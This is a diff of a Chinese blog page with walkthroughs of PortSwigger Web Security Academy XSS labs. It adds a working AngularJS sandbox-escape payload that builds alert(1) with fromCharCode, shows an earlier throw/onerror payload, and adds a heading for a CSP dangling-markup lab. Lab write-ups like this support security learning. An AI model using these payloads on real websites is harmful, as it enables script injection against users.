@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102104890.jpg">
 <meta property="article:published_time" content="2022-11-10T07:28:02.000Z">
-<meta property="article:modified_time" content="2023-03-14T09:03:36.418Z">
+<meta property="article:modified_time" content="2023-08-08T12:15:05.961Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="xss">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          6.9k 字
+          7.2k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          58 分钟
+          60 分钟
         
       </span>
     
@@ -575,7 +575,11 @@
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">https:</span>//YOUR-LAB-ID.web-security-academy.net/post?postId<span class="hljs-operator">=</span><span class="hljs-number">5</span>&amp;<span class="hljs-variable">%27</span>&#125;<span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-operator">=</span><span class="hljs-variable">%3</span>E&#123;throw/**/onerror<span class="hljs-operator">=</span>alert<span class="hljs-punctuation">,</span><span class="hljs-number">1337</span>&#125;<span class="hljs-punctuation">,</span>toString<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>window<span class="hljs-variable">%2</span>b<span class="hljs-variable">%27</span><span class="hljs-variable">%27</span><span class="hljs-punctuation">,</span>&#123;<span class="hljs-keyword">x</span>:<span class="hljs-variable">%27</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202303141650251.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<h3 id="27-反射式XSS与AngularJS沙盒转义没有字符串"><a href="#27-反射式XSS与AngularJS沙盒转义没有字符串" class="headerlink" title="27.反射式XSS与AngularJS沙盒转义没有字符串"></a>27.反射式XSS与AngularJS沙盒转义没有字符串</h3>
+<h3 id="27-反射式XSS与AngularJS沙盒转义没有字符串"><a href="#27-反射式XSS与AngularJS沙盒转义没有字符串" class="headerlink" title="27.反射式XSS与AngularJS沙盒转义没有字符串"></a>27.反射式XSS与AngularJS沙盒转义没有字符串</h3><p>直接使用payload</p>
+<p>payload</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://YOUR-LAB-ID.web-security-academy.net/?search=<span class="hljs-number">1</span>&amp;toString().constructor.prototype.charAt%<span class="hljs-number">3</span>d[].join;[<span class="hljs-number">1</span>]|orderBy:toString().constructor.fromCharCode(<span class="hljs-number">120</span>,<span class="hljs-number">61</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>)=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure>
+
+<h3 id="28-反射式XSS由非常严格的CSP保护，带有悬空标记攻击"><a href="#28-反射式XSS由非常严格的CSP保护，带有悬空标记攻击" class="headerlink" title="28.反射式XSS由非常严格的CSP保护，带有悬空标记攻击"></a>28.<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/reflected">反射式XSS</a>由非常严格的CSP保护，带有<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">悬空标记</a>攻击</h3>
                 
               </div>
             
@@ -971,5 +975,20 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 </body>
 </html>
